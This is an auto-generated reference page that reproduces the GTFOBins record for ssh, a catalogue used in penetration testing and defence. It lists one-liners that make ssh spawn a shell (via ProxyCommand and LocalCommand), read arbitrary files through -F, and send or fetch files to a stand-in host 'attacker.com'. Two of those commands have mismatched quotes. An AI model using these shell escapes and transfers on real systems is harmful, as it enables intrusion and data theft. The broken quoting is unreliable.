---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ssh

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ssh` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ssh](../../tools/linux/ssh.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ssh |
| name | ssh |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/ssh/ |

## Preserved Source Material

```yaml
_body: ''
_name: ssh
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh
functions:
  download:
  - code: ssh user@attacker.com 'cat /path/to/input-file"
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: ssh-server
  file-read:
  - code: ssh -F /path/to/input-file x
    comment: The read file content is corrupted by error prints.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: ssh localhost /bin/sh
    comment: Reconnecting may help bypassing restricted shells.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  - code: ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
    contexts:
      sudo: null
      unprivileged: null
  - code: ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
    comment: Spawn the shell on the client, but still requires a successful remote connection.
    contexts:
      sudo: null
      unprivileged: null
  upload:
  - code: echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: ssh-server
```
